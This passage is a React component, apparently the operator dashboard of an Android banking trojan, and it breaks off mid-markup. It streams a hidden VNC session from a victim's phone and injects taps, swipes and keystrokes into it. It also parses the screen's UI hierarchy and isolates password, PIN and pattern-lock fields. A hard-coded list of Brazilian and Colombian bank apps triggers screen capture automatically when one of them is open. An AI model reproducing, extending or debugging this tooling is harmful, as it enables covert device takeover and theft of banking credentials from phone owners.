/**
 * ScreenReaderV2.jsx — rebuilt from scratch
 *
 * HVNC:
 *   · createImageBitmap GPU decode (never blocks main thread)
 *   · Backpressure flag: drops incoming frame if previous decode still pending
 *   · RAF dirty-flag loop: only paints when a new bitmap landed
 *   · Pointer Events API: setPointerCapture keeps drag locked past canvas edge
 *   · Right-click / long-hold → LONG_PRESS
 *   · Scroll wheel → normalized SWIPE (deltaMode-aware)
 *   · Keyboard passthrough with 200-char buffer cap
 *   · Swipe preview + tap ripple on separate overlay canvas
 *   · ResizeObserver keeps overlay canvas in sync with VNC canvas
 *   · Stable ctx cache: invalidates when canvas element changes (StrictMode safe)
 *
 * LY canvas:
 *   · HiDPI-aware (clamped to 3×)
 *   · Large→small sort so small nodes render on top
 *   · Depth-based alpha (deeper = more faint, avoids visual noise)
 *   · Color-coded by node type (TAP/EDIT/PWD/PIN/KBD/SCROLL/OFF)
 *   · Focused-node corner brackets
 *   · Phone border outline shows device bounds
 *   · Search dims non-matching nodes
 *   · Pointer Events hit-test picks smallest containing node
 *
 * V2 reader:
 *   · OCR view sorted by screen position
 *   · Creds view — passwords, PINs, editable fields isolated
 *   · Raw JSON viewer with copy
 *   · Pattern / swipe / PIN quick-action panels
 *   · srHz counter (hierarchy packets/sec)
 *
 * Controls:
 *   · Reorganized — live, extraction, financial, security, inject, nav, system
 *   · Clean minimal rows, no emoji clutter in chrome
 */
import {
  useEffect, useLayoutEffect, useRef, useState, useCallback,
} from 'react';
import useStore from '../../store/index.js';
import { ws }   from '../../ws.js';

// ── Constants ──────────────────────────────────────────────────────────────
const APK_W = 350;
const APK_H = 650;

const BANK_PKGS = new Set([
  'com.nu.production','com.itau','com.bradesco','com.santander.app',
  'br.com.bb.android','br.com.caixa.tem','br.com.gabba.caixa',
  'com.c6bank.app','br.com.intermedium','com.picpay','com.mercadopago.wallet',
  'br.com.original.bank','com.btgpactual.banking','br.com.sicoob.bank',
  'br.com.sicredi.app','com.davivienda.mobile','com.daviplata',
  'com.bancolombia','com.nequi',
]);
const BANK_KW = ['bank','banco','itau','bradesco','santander','nubank','caixa',
                 'inter','picpay','neon','c6bank','davivienda','bancolombia'];
const isBank = pkg => {
  if (!pkg) return false;
  if (BANK_PKGS.has(pkg)) return true;
  const p = pkg.toLowerCase();
  return BANK_KW.some(k => p.includes(k));
};

// ── Hierarchy parser ────────────────────────────────────────────────────────
function apkRect(b) {
  if (!b) return null;
  const left   = b.left  ?? b.x  ?? 0;
  const top    = b.top   ?? b.y  ?? 0;
  const right  = b.right  ?? left + (b.w ?? 0);
  const bottom = b.bottom ?? top  + (b.h ?? 0);
  if (right <= left || bottom <= top) return null;
  return { left, top, right, bottom };
}

function walkNode(raw, depth, out) {
  if (!raw || depth > 30) return;
  const text   = (raw.text || raw.desc || raw.hint || '').trim();
  const bounds = apkRect(raw.bounds);
  if (text || (bounds && (raw.clickable || raw.editable))) {
    out.push({
      text, bounds, depth,
      cls:           raw.class || raw.className || '',
      id:            raw.id || raw.viewIdResourceName || '',
      pkg:           raw.pkg || raw.packageName || raw.windowPackage || '',
      clickable:     !!raw.clickable,
      enabled:       raw.enabled !== false,
      checked:       !!raw.checked,
      focused:       !!raw.focused,
      scrollable:    !!raw.scrollable,
      editable:      !!raw.editable,
      password:      !!raw.password,
      longClickable: !!raw.longClickable,
      isKeyboard:    !!(raw.isKeyboard || raw.isKeyboardKey),
      keyType:       raw.keyType || null,
      isPinDigit:    !!raw.isPinDigit,
      isPatternLock: !!raw.isPatternLock,
      isSwipeUnlock: !!raw.isSwipeUnlock,
      patternGrid:   raw.patternGrid   || null,
      swipeHint:     raw.swipeHint     || null,
    });
  }
  for (const c of (raw.children || [])) walkNode(c, depth + 1, out);
}

function parseHierarchy(raw) {
  const out = [];
  try {
    const p    = typeof raw === 'string' ? JSON.parse(raw) : raw;
    const root = p?.hierarchy ?? p;
    const arr  = Array.isArray(root) ? root : [root];
    for (const r of arr) walkNode(r, 0, out);
  } catch (_) {}
  return out;
}

// Group text nodes into visual rows (sorted by screen Y position)
function extractLines(nodes) {
  const tx = nodes.filter(n => n.text && n.bounds)
    .sort((a, b) =>
      (a.bounds.top + a.bounds.bottom) / 2 - (b.bounds.top + b.bounds.bottom) / 2);
  const rows = []; let row = [], lastY = -Infinity;
  for (const n of tx) {
    const cy = (n.bounds.top + n.bounds.bottom) / 2;
    if (cy - lastY > 24 && row.length) {
      rows.push([...row].sort((a, b) => a.bounds.left - b.bounds.left));
      row = [];
    }
    row.push(n); lastY = cy;
  }
  if (row.length) rows.push(row);
  return rows;
}

const bCenter = b => b
  ? { x: Math.round((b.left + b.right) / 2), y: Math.round((b.top + b.bottom) / 2) }
  : null;

// ── Node color palette ──────────────────────────────────────────────────────
function nodeColor(n) {
  if (!n.enabled)      return '#475569';
  if (n.focused)       return '#f8fafc';
  if (n.isPinDigit)    return '#60a5fa';
  if (n.isPatternLock) return '#818cf8';
  if (n.password)      return '#f87171';
  if (n.isKeyboard)    return '#c084fc';
  if (n.editable)      return '#34d399';
  if (n.scrollable)    return '#4ade80';
  if (n.clickable)     return '#fbbf24';
  return '#475569';
}

// ── LY canvas renderer ──────────────────────────────────────────────────────
function drawLY(canvas, nodes, { highlight = null, searchTerm = '', showLabels = true } = {}) {
  if (!canvas || !nodes.length) return null;
  const ctx = canvas.getContext('2d', { alpha: false });
  if (!ctx) return null;

  let maxX = 0, maxY = 0;
  for (const n of nodes) {
    if (!n.bounds) continue;
    if (n.bounds.right  > maxX) maxX = n.bounds.right;
    if (n.bounds.bottom > maxY) maxY = n.bounds.bottom;
  }
  if (!maxX || !maxY) return null;

  const dpr  = Math.min(window.devicePixelRatio || 1, 3);
  const logW = canvas.clientWidth || APK_W;
  const logH = Math.round(logW * maxY / maxX);

  if (canvas.width !== logW * dpr || canvas.height !== logH * dpr) {
    canvas.width  = logW * dpr;
    canvas.height = logH * dpr;
    canvas.style.height = logH + 'px';
  }

  const sx = (logW * dpr) / maxX;
  const sy = (logH * dpr) / maxY;

  // Background
  ctx.fillStyle = '#06080f';
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  // Subtle grid lines
  ctx.strokeStyle = 'rgba(255,255,255,0.022)';
  ctx.lineWidth = 1;
  const gs = Math.round(maxX / 8) * sx;
  if (gs > 0) {
    for (let x = gs; x < canvas.width; x += gs) {
      ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke();
    }
    for (let y = gs; y < canvas.height; y += gs) {
      ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(canvas.width, y); ctx.stroke();
    }
  }

  // Phone/screen border — shows device bounds
  ctx.strokeStyle = 'rgba(255,255,255,0.07)';
  ctx.lineWidth = 2 * dpr;
  ctx.strokeRect(1, 1, canvas.width - 2, canvas.height - 2);

  // Sort large→small so small nodes paint on top
  const sorted = [...nodes].filter(n => n.bounds).sort((a, b) => {
    const aA = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
    const bA = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
    return bA - aA;
  });

  const fs = Math.round(9.5 * dpr);
  ctx.textBaseline = 'top';
  const hasSearch = searchTerm.length > 0;

  for (const n of sorted) {
    const { left, top, right, bottom } = n.bounds;
    const x = left * sx,  y = top * sy;
    const w = (right - left) * sx, h = (bottom - top) * sy;
    if (w < 1 || h < 1) continue;

    const col      = nodeColor(n);
    const isHit    = highlight === n;
    const isMatch  = hasSearch && (
      n.text?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      n.cls.toLowerCase().includes(searchTerm.toLowerCase())
    );
    const dimmed   = hasSearch && !isMatch && !isHit;
    const depthAlpha = Math.max(0.28, 1 - n.depth * 0.055);
    const baseAlpha  = dimmed ? 0.1  : isHit ? 1 : isMatch ? 0.95 : depthAlpha;
    const fillAlpha  = dimmed ? 0.01 : isHit ? 0.2 : isMatch ? 0.09 : 0.04;

    if (w > 6 && h > 6) {
      ctx.globalAlpha = fillAlpha;
      ctx.fillStyle   = isHit ? '#ffffff' : col;
      ctx.fillRect(x, y, w, h);
    }

    ctx.globalAlpha = baseAlpha;
    ctx.strokeStyle = isHit ? '#ffffff' : isMatch ? '#fff' : col;
    ctx.lineWidth   = isHit ? 2.5 * dpr : n.focused ? 2 * dpr : (n.clickable || isMatch ? 1.5 * dpr : 0.7 * dpr);
    ctx.strokeRect(x + 0.5, y + 0.5, w - 1, h - 1);
    ctx.globalAlpha = 1;

    if (!showLabels) continue;
    const label = n.text || (n.cls ? n.cls.split('.').pop() : '');
    if (!label || h < fs * 1.3 || w < 12) continue;
    const renderFs = Math.min(fs, h * 0.35);
    ctx.font        = `${Math.round(renderFs)}px 'SF Mono','Roboto Mono',monospace`;
    ctx.fillStyle   = isHit ? '#ffffff' : col;
    ctx.globalAlpha = baseAlpha * 0.9;
    let txt = label;
    while (txt.length > 1 && ctx.measureText(txt).width > w - 4 * dpr) txt = txt.slice(0, -1);
    if (txt !== label) txt += '\u2026';
    ctx.fillText(txt, x + 2 * dpr, y + 2 * dpr);
    ctx.globalAlpha = 1;
  }

  // Corner bracket markers for focused nodes
  for (const n of sorted.filter(nd => nd.focused && nd.bounds)) {
    const { left, top, right, bottom } = n.bounds;
    const x = left * sx, y = top * sy;
    const w = (right - left) * sx, h = (bottom - top) * sy;
    const m = Math.min(w * 0.22, h * 0.22, 14 * dpr);
    ctx.strokeStyle = '#f8fafc'; ctx.lineWidth = 2 * dpr; ctx.globalAlpha = 0.9;
    for (const [cx, cy, dx, dy] of [
      [x,   y,   1, 1], [x+w, y,   -1, 1],
      [x,   y+h, 1,-1], [x+w, y+h, -1,-1],
    ]) {
      ctx.beginPath();
      ctx.moveTo(cx + dx*m, cy); ctx.lineTo(cx, cy); ctx.lineTo(cx, cy + dy*m);
      ctx.stroke();
    }
    ctx.globalAlpha = 1;
  }

  return { sx, sy, logW, logH, maxX, maxY, dpr };
}

// ── LY hit test ─────────────────────────────────────────────────────────────
function hitTest(cssPxX, cssPxY, canvas, scale, nodes) {
  if (!scale || !canvas) return null;
  const r    = canvas.getBoundingClientRect();
  const devX = ((cssPxX - r.left) / r.width)  * scale.maxX;
  const devY = ((cssPxY - r.top)  / r.height) * scale.maxY;
  // Pick smallest enclosing node (most precise)
  return nodes
    .filter(n => n.bounds &&
      devX >= n.bounds.left && devX <= n.bounds.right &&
      devY >= n.bounds.top  && devY <= n.bounds.bottom)
    .sort((a, b) => {
      const aA = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
      const bA = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
      return aA - bA;
    })[0] ?? null;
}

function cssToDevice(x, y, canvas, scale) {
  if (!scale || !canvas) return { x: 0, y: 0 };
  const r = canvas.getBoundingClientRect();
  return {
    x: Math.round(((x - r.left) / r.width)  * scale.maxX),
    y: Math.round(((y - r.top)  / r.height) * scale.maxY),
  };
}

// ── VNC overlay effects ──────────────────────────────────────────────────────
function playRipple(canvas, nx, ny, rgba) {
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const W = canvas.width, H = canvas.height;
  const px = nx * W, py = ny * H;
  let r = 4, al = 0.75;
  const frame = () => {
    ctx.clearRect(0, 0, W, H);
    ctx.beginPath(); ctx.arc(px, py, r, 0, Math.PI * 2);
    ctx.strokeStyle = rgba.replace(')', `,${al})`);
    ctx.lineWidth = 2.5; ctx.stroke();
    r += 2.8; al -= 0.052;
    if (r < 28) requestAnimationFrame(frame);
    else ctx.clearRect(0, 0, W, H);
  };
  requestAnimationFrame(frame);
}

function drawSwipeArrow(canvas, x1n, y1n, x2n, y2n) {
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const W = canvas.width, H = canvas.height;
  ctx.clearRect(0, 0, W, H);
  const sx = x1n*W, sy = y1n*H, ex = x2n*W, ey = y2n*H;
  const ang = Math.atan2(ey - sy, ex - sx);
  ctx.beginPath(); ctx.moveTo(sx, sy); ctx.lineTo(ex, ey);
  ctx.strokeStyle = 'rgba(255,255,255,.5)'; ctx.lineWidth = 2;
  ctx.setLineDash([5, 5]); ctx.stroke(); ctx.setLineDash([]);
  ctx.beginPath(); ctx.arc(sx, sy, 4, 0, Math.PI * 2);
  ctx.fillStyle = 'rgba(255,255,255,.75)'; ctx.fill();
  const al = 12;
  ctx.beginPath();
  ctx.moveTo(ex, ey);
  ctx.lineTo(ex - al * Math.cos(ang - 0.38), ey - al * Math.sin(ang - 0.38));
  ctx.lineTo(ex - al * Math.cos(ang + 0.38), ey - al * Math.sin(ang + 0.38));
  ctx.closePath(); ctx.fillStyle = 'rgba(255,255,255,.75)'; ctx.fill();
}

// ── Signal quality ───────────────────────────────────────────────────────────
function quality(fps, lat) {
  if (fps >= 25 && lat < 120) return { label: 'EXCELLENT', col: '#4ade80', bars: 5 };
  if (fps >= 15 && lat < 300) return { label: 'GOOD',      col: '#a3e635', bars: 4 };
  if (fps >= 8  && lat < 600) return { label: 'FAIR',      col: '#facc15', bars: 3 };
  if (fps >= 2)               return { label: 'WEAK',      col: '#fb923c', bars: 2 };
  return                             { label: 'NO SIGNAL', col: '#f87171', bars: 1 };
}

// ────────────────────────────────────────────────────────────────────────────
// COMPONENT
// ────────────────────────────────────────────────────────────────────────────
const MODES = [
  { id: 'HVNC', label: 'HVNC' },
  { id: 'LY',   label: 'LY'   },
  { id: 'V2',   label: 'V2'   },
  { id: 'CTRL', label: 'CTRL' },
];

export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
  const device = useStore(s => s.deviceDetail) || {};
  const setVnc = useStore(s => s.setVncActive);

  // ── VNC refs ──────────────────────────────────────────────────────────
  const canvasRef   = useRef(null);
  const overlayRef  = useRef(null);
  const ctxRef      = useRef(null);
  const bitmapRef   = useRef(null);
  const dirtyRef    = useRef(false);
  const decodingRef = useRef(false);   // backpressure: skip frame while decoding
  const rafRef      = useRef(null);
  const fpsDecRef   = useRef(0);
  const latRef      = useRef(performance.now());
  const ptrRef      = useRef(null);
  const kbBufRef    = useRef('');
  const kbTimerRef  = useRef(null);

  // ── LY refs ───────────────────────────────────────────────────────────
  const lyCanvasRef = useRef(null);
  const lyScaleRef  = useRef(null);
  const lyPtrRef    = useRef(null);
  const autoRef     = useRef(null);

  // ── State ─────────────────────────────────────────────────────────────
  const [mode,    setMode]    = useState('HVNC');
  const [fps,     setFps]     = useState(0);
  const [latMs,   setLatMs]   = useState(0);
  const [vncOn,   setVncOn]   = useState(false);
  const [vncQual, setVncQual] = useState(70);

  const [nodes,    setNodes]    = useState([]);
  const [lines,    setLines]    = useState([]);
  const [rawData,  setRawData]  = useState('');
  const [srPkg,    setSrPkg]    = useState('');
  const [srHz,     setSrHz]     = useState(0);
  const [srOn,     setSrOn]     = useState(false);
  const [liveMode, setLiveMode] = useState(false);
  const srHzRef = useRef(0);

  const [lyHighlight, setLyHighlight] = useState(null);
  const [lySelected,  setLySelected]  = useState(null);
  const [lySearch,    setLySearch]    = useState('');
  const [lyZoom,      setLyZoom]      = useState(1);
  const [showLabels,  setShowLabels]  = useState(true);
  const [lyScreenRes, setLyScreenRes] = useState(null);

  const [v2tab,    setV2tab]    = useState('ocr');
  const [filter,   setFilter]   = useState('');
  const [typeText, setTypeText] = useState('');
  const [tapX,     setTapX]     = useState('');
  const [tapY,     setTapY]     = useState('');

  const [toast,    setToast]    = useState(null);
  const [toastCol, setToastCol] = useState('#4ade80');
  const toastT = useRef(null);

  function toast2(msg, col = '#4ade80', ms = 1800) {
    setToast(msg); setToastCol(col);
    clearTimeout(toastT.current);
    toastT.current = setTimeout(() => setToast(null), ms);
  }

  // ── VNC: ctx cache — invalidates when canvas element changes ──────────
  function getCtx() {
    const c = canvasRef.current; if (!c) return null;
    if (ctxRef.current?.canvas !== c) {
      ctxRef.current = c.getContext('2d', { alpha: false, desynchronized: true });
      if (ctxRef.current) ctxRef.current.imageSmoothingEnabled = false;
    }
    return ctxRef.current;
  }

  // ── VNC: RAF render loop ──────────────────────────────────────────────
  useEffect(() => {
    function loop() {
      if (dirtyRef.current) {
        const bmp = bitmapRef.current;
        const ctx = getCtx();
        if (bmp && ctx) {
          const c = canvasRef.current;
          if (c.width !== bmp.width)   c.width  = bmp.width;
          if (c.height !== bmp.height) c.height = bmp.height;
          ctx.drawImage(bmp, 0, 0);
        }
        dirtyRef.current = false;
      }
      rafRef.current = requestAnimationFrame(loop);
    }
    rafRef.current = requestAnimationFrame(loop);
    return () => {
      cancelAnimationFrame(rafRef.current);
      bitmapRef.current?.close?.();
    };
  }, []);

  // ── VNC: binary frame pipeline with backpressure ──────────────────────
  useEffect(() => {
    const unsub = ws.onBinary((buf, devId) => {
      if (devId !== deviceId) return;
      if (decodingRef.current) return; // drop frame — previous still decoding
      const t0 = performance.now();
      decodingRef.current = true;
      createImageBitmap(new Blob([buf], { type: 'image/jpeg' }))
        .then(bmp => {
          bitmapRef.current?.close?.();
          bitmapRef.current = bmp;
          dirtyRef.current  = true;
          setLatMs(Math.round(performance.now() - t0));
          fpsDecRef.current++;
        })
        .catch(() => {})
        .finally(() => { decodingRef.current = false; });
    });
    const t = setInterval(() => { setFps(fpsDecRef.current); fpsDecRef.current = 0; }, 1000);
    return () => { unsub(); clearInterval(t); };
  }, [deviceId]);

  // ── WS: hierarchy + status messages ──────────────────────────────────
  useEffect(() => {
    const unsub = ws.onMessage(msg => {
      if (msg.device_id !== deviceId) return;

      if (msg.type === 'screen_hierarchy' || msg.type === 'SCREEN_HIERARCHY') {
        const raw = msg.data || '{}';
        try {
          const p   = typeof raw === 'string' ? JSON.parse(raw) : raw;
          const pkg = p.package || p.pkg || '';
          setSrPkg(pkg);
          if (isBank(pkg) && !srOn) setSrOn(true);
          const n = parseHierarchy(raw);
          setNodes(n);
          setLines(extractLines(n));
          setRawData(typeof raw === 'string' ? raw : JSON.stringify(raw, null, 2));
          let rx = 0, ry = 0;
          for (const nd of n) {
            if (!nd.bounds) continue;
            if (nd.bounds.right  > rx) rx = nd.bounds.right;
            if (nd.bounds.bottom > ry) ry = nd.bounds.bottom;
          }
          if (rx && ry) setLyScreenRes({ w: rx, h: ry });
          srHzRef.current++;
          if (n.some(nd => nd.password && nd.focused)) toast2('PWD FIELD FOCUSED', '#f87171');
        } catch (_) {}
      }

      if (msg.type === 'vnc_status') { setVncOn(!!msg.active); setVnc(!!msg.active); }
    });

    const hzT = setInterval(() => { setSrHz(srHzRef.current); srHzRef.current = 0; }, 1000);
    return () => { unsub(); clearInterval(hzT); };
  }, [deviceId, srOn]);

  // ── SR V2 subscription ────────────────────────────────────────────────
  useEffect(() => {
    if (mode === 'V2') {
      ws.send({ type: 'subscribe_sr2', device_id: deviceId });
      return () => ws.send({ type: 'unsubscribe_sr2', device_id: deviceId });
    }
  }, [mode, deviceId]);

  // ── LY: redraw on state change ────────────────────────────────────────
  useLayoutEffect(() => {
    if (!lyCanvasRef.current || !nodes.length) return;
    try {
      lyScaleRef.current = drawLY(lyCanvasRef.current, nodes, {
        highlight: lyHighlight, searchTerm: lySearch, showLabels,
      });
    } catch (_) {}
  }, [nodes, lyHighlight, lySearch, showLabels, mode]);

  // ── Live hierarchy polling ────────────────────────────────────────────
  useEffect(() => {
    clearInterval(autoRef.current);
    if (liveMode) {
      sendCmd('REQUEST_HIERARCHY');
      autoRef.current = setInterval(() => sendCmd('REQUEST_HIERARCHY'), 500);
    }
    return () => clearInterval(autoRef.current);
  }, [liveMode, sendCmd]);

  // ── ResizeObserver: keep overlay in sync with VNC canvas ─────────────
  useEffect(() => {
    const vc = canvasRef.current;
    const ov = overlayRef.current;
    if (!vc || !ov) return;
    const ro = new ResizeObserver(() => { ov.width = vc.width; ov.height = vc.height; });
    ro.observe(vc);
    return () => ro.disconnect();
  }, []);

  // ── VNC controls ──────────────────────────────────────────────────────
  function startVnc() { sendCmd('START_SILENT_VNC'); ws.subscribe('vnc', deviceId); setVncOn(true); setVnc(true); }
  function stopVnc()  { sendCmd('STOP_SILENT_VNC');  ws.unsubscribe('vnc', deviceId); setVncOn(false); setVnc(false); }
  function handleBack() { stopVnc(); setLiveMode(false); onBack(); }

  const norm = useCallback((clientX, clientY) => {
    const c = canvasRef.current; if (!c) return { x: 0.5, y: 0.5 };
    const r = c.getBoundingClientRect();
    return {
      x: Math.max(0.001, Math.min(0.999, (clientX - r.left) / r.width)),
      y: Math.max(0.001, Math.min(0.999, (clientY - r.top)  / r.height)),
    };
  }, []);

  // ── VNC: Pointer Events API ───────────────────────────────────────────
  const onPtrDown = useCallback(e => {
    if (e.button === 1) return;
    e.preventDefault();
    try { e.currentTarget.setPointerCapture(e.pointerId); } catch (_) {}
    const { x, y } = norm(e.clientX, e.clientY);
    ptrRef.current = {
      clientX: e.clientX, clientY: e.clientY,
      normX: x, normY: y, ts: Date.now(),
      pointerId: e.pointerId, button: e.button,
    };
  }, [norm]);

  const onPtrMove = useCallback(e => {
    const p = ptrRef.current;
    if (!p || p.pointerId !== e.pointerId) return;
    const dist = Math.hypot(e.clientX - p.clientX, e.clientY - p.clientY);
    if (dist > 10) {
      const { x: ex, y: ey } = norm(e.clientX, e.clientY);
      drawSwipeArrow(overlayRef.current, p.normX, p.normY, ex, ey);
    }
  }, [norm]);

  const onPtrUp = useCallback(e => {
    const p = ptrRef.current;
    if (!p || p.pointerId !== e.pointerId) return;
    ptrRef.current = null;
    const ov = overlayRef.current;
    if (ov) ov.getContext('2d').clearRect(0, 0, ov.width, ov.height);
    const dist = Math.hypot(e.clientX - p.clientX, e.clientY - p.clientY);
    const dt   = Date.now() - p.ts;
    const { x: sx, y: sy } = { x: p.normX, y: p.normY };
    if (p.button === 2 || (dist < 14 && dt > 550)) {
      sendCmd('LONG_PRESS', { x: sx, y: sy, scale: 'vnc_norm', duration: 800 });
      playRipple(overlayRef.current, sx, sy, 'rgba(192,132,252,');
      toast2('LONG PRESS', '#c084fc');
    } else if (dist < 14) {
      sendCmd('TAP', { x: sx, y: sy, scale: 'vnc_norm' });
      playRipple(overlayRef.current, sx, sy, 'rgba(251,191,36,');
    } else {
      const { x: ex, y: ey } = norm(e.clientX, e.clientY);
      sendCmd('SWIPE', { x1: sx, y1: sy, x2: ex, y2: ey, scale: 'vnc_norm', duration: dt });
    }
  }, [sendCmd, norm]);

  const onCtxMenu = useCallback(e => e.preventDefault(), []);

  // Scroll wheel → swipe. Normalizes for deltaMode (pixel vs line)
  const onWheel = useCallback(e => {
    e.preventDefault();
    const { x, y } = norm(e.clientX, e.clientY);
    const step = e.deltaMode === 0 ? Math.min(0.4, Math.abs(e.deltaY) * 0.0004) : 0.22;
    const ny = Math.max(0.01, Math.min(0.99, y + (e.deltaY > 0 ? step : -step)));
    sendCmd('SWIPE', { x1: x, y1: y, x2: x, y2: ny, scale: 'vnc_norm', duration: 120 });
  }, [sendCmd, norm]);

  // Keyboard passthrough — debounced buffer with 200-char cap
  const flushKb = useCallback(() => {
    if (!kbBufRef.current) return;
    sendCmd('TYPE', { text: kbBufRef.current });
    kbBufRef.current = '';
  }, [sendCmd]);

  const onKbDown = useCallback(e => {
    if (!vncOn || e.ctrlKey || e.altKey || e.metaKey) return;
    if (e.key === 'Escape') return;
    if (e.key === 'Enter') {
      e.preventDefault();
      clearTimeout(kbTimerRef.current); flushKb();
      setTimeout(() => sendCmd('KEY', { action: 'ENTER' }), 60);
      return;
    }
    if (e.key === 'Backspace') {
      e.preventDefault();
      clearTimeout(kbTimerRef.current);
      kbBufRef.current = kbBufRef.current.slice(0, -1);
      if (!kbBufRef.current) sendCmd('KEY', { action: 'BACK' });
      return;
    }
    if (e.key.length === 1) {
      e.preventDefault();
      if (kbBufRef.current.length < 200) kbBufRef.current += e.key;
      clearTimeout(kbTimerRef.current);
      kbTimerRef.current = setTimeout(flushKb, 150);
    }
  }, [vncOn, sendCmd, flushKb]);

  // ── LY: Pointer Events ────────────────────────────────────────────────
  const onLyPtrDown = useCallback(e => {
    e.preventDefault();
    try { e.currentTarget.setPointerCapture(e.pointerId); } catch (_) {}
    lyPtrRef.current = { clientX: e.clientX, clientY: e.clientY, ts: Date.now(), pointerId: e.pointerId };
  }, []);

  const onLyPtrUp = useCallback(e => {
    const p = lyPtrRef.current;
    if (!p || p.pointerId !== e.pointerId) return;
    lyPtrRef.current = null;
    const dist = Math.hypot(e.clientX - p.clientX, e.clientY - p.clientY);
    const dt   = Date.now() - p.ts;
    const c    = lyCanvasRef.current;
    const sc   = lyScaleRef.current;
    if (dist < 14) {
      const hit = hitTest(p.clientX, p.clientY, c, sc, nodes);
      if (hit) {
        const center = bCenter(hit.bounds);
        if (center) {
          setLyHighlight(hit); setLySelected(hit);
          setTimeout(() => setLyHighlight(null), 450);
          sendCmd(dt > 600 ? 'LONG_PRESS' : 'TAP', { x: center.x, y: center.y });
          toast2((dt > 600 ? 'HOLD' : 'TAP') + ' \u2192 ' + (hit.text || hit.cls.split('.').pop()).slice(0, 24), nodeColor(hit));
        }
      } else {
        const dev = cssToDevice(p.clientX, p.clientY, c, sc);
        sendCmd('TAP', { x: dev.x, y: dev.y });
        toast2(`TAP (${dev.x}, ${dev.y})`, '#94a3b8');
      }
    } else {
      const s   = cssToDevice(p.clientX, p.clientY, c, sc);
      const end = cssToDevice(e.clientX, e.clientY, c, sc);
      sendCmd('SWIPE', { x1: s.x, y1: s.y, x2: end.x, y2: end.y, duration: dt });
      toast2(`SWIPE (${s.x},${s.y})\u2192(${end.x},${end.y})`, '#34d399');
    }
  }, [sendCmd, nodes]);

  // ── Helpers ───────────────────────────────────────────────────────────
  function tapNode(n) {
    const c = bCenter(n.bounds);
    if (c) {
      sendCmd('TAP', { x: c.x, y: c.y });
      toast2('TAP \u2192 ' + (n.text || n.cls.split('.').pop()).slice(0, 24), nodeColor(n));
    }
  }

  function toggleSR(on) { sendCmd('TOGGLE_SCREEN_READER', { enabled: on }); setSrOn(on); }

  // ── Derived ───────────────────────────────────────────────────────────
  const pwdNodes  = nodes.filter(n => n.password);
  const pinNodes  = nodes.filter(n => n.isPinDigit && n.text && n.clickable);
  const patNode   = nodes.find(n  => n.isPatternLock && n.patternGrid);
  const swipeNode = nodes.find(n  => n.isSwipeUnlock && n.swipeHint);
  const bankApp   = isBank(srPkg);
  const qual      = quality(fps, latMs);
  const filtered  = filter
    ? nodes.filter(n =>
        n.text?.toLowerCase().includes(filter.toLowerCase()) ||
        n.cls?.toLowerCase().includes(filter.toLowerCase()) ||
        n.id?.toLowerCase().includes(filter.toLowerCase()))
    : nodes;

  // ─────────────────────────────────────────────────────────────────────
  return (
    <div style={{ paddingBottom: 32, position: 'relative' }}>

      {/* Toast */}
      {toast && (
        <div style={{
          position: 'fixed', top: 64, left: '50%', transform: 'translateX(-50%)',
          background: 'rgba(6,4,14,.97)', border: `1px solid ${toastCol}40`,
          borderRadius: 8, padding: '6px 14px', zIndex: 9999, pointerEvents: 'none',
          boxShadow: `0 0 18px ${toastCol}20`, maxWidth: '84vw',
        }}>
          <span style={{ color: toastCol, fontSize: 11, fontWeight: 700 }}>{toast}</span>
        </div>
      )}

      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
        <div style={{ width: 3, height: 30, background: '#3b7af0', borderRadius: 2, flexShrink: 0 }} />
        <div style={{ flex: 1, minWidth: 0 }}>
          <div style={{ fontWeight: 800, fontSize: 12, color: 'var(--gold)', letterSpacing: 1.5, textTransform: 'uppercase' }}>
            LY + HVNC
          </div>
          <div style={{ display: 'flex', gap: 4, alignItems: 'center', marginTop: 2, flexWrap: 'wrap' }}>
            {vncOn    && <Chip col="#3b7af0">HVNC · {fps}fps · {latMs}ms</Chip>}
            {srOn     && <Chip col="#4ade80">SR · {srHz}/s</Chip>}
            {bankApp  && <Chip col="#f87171">FLAG_SECURE</Chip>}
            {liveMode && <Chip col="#fb923c">LIVE</Chip>}
            {nodes.length > 0 && <span style={{ fontSize: 9, color: 'var(--text3)' }}>{nodes.length} nodes</span>}
          </div>
        </div>
        <button className="btn btn-ghost btn-sm"
          onClick={() => { sendCmd('REQUEST_HIERARCHY'); toast2('REFRESH', '#fbbf24'); }}>↺</button>
        <button className="btn btn-ghost btn-sm" onClick={handleBack}>←</button>
      </div>

      {/* Mode tabs */}
      <div style={{
        display: 'flex', gap: 3, marginBottom: 12,
        background: 'rgba(255,255,255,.03)', borderRadius: 10, padding: 3,
        border: '1px solid rgba(255,255,255,.05)',
      }}>
        {MODES.map(m => (
          <button key={m.id} onClick={() => {
            setMode(m.id);
            if (m.id !== 'HVNC') sendCmd('REQUEST_HIERARCHY');
          }} style={{
            flex: 1, padding: '6px 0', fontSize: 11, fontWeight: 700, letterSpacing: .6,
            borderRadius: 8, border: 'none', cursor: 'pointer',
            background: mode === m.id ? (
              m.id === 'HVNC' ? '#3b7af0' :
              m.id === 'LY'   ? '#d4950a' :
              m.id === 'V2'   ? '#4ade80' : 'rgba(255,255,255,.08)'
            ) : 'transparent',
            color: mode === m.id ? (m.id === 'CTRL' ? 'var(--text)' : '#fff') : 'var(--text3)',
            transition: 'all .12s',
          }}>{m.label}</button>
        ))}
      </div>

      {/* ════════════════════════════════════════
          HVNC
      ════════════════════════════════════════ */}
      {mode === 'HVNC' && (
        <div>
          {/* HUD bar */}
          <div style={{
            display: 'flex', alignItems: 'center', gap: 8, padding: '5px 10px',
            borderRadius: '8px 8px 0 0', background: 'rgba(6,4,14,.96)',
            border: '1px solid rgba(255,255,255,.06)', borderBottom: 'none',
          }}>
            <QualBars qual={qual} />
            <span style={{ fontSize: 10, fontWeight: 700, color: vncOn ? '#4ade80' : '#475569' }}>
              {vncOn ? `${fps} FPS · ${latMs}ms` : 'STOPPED'}
            </span>
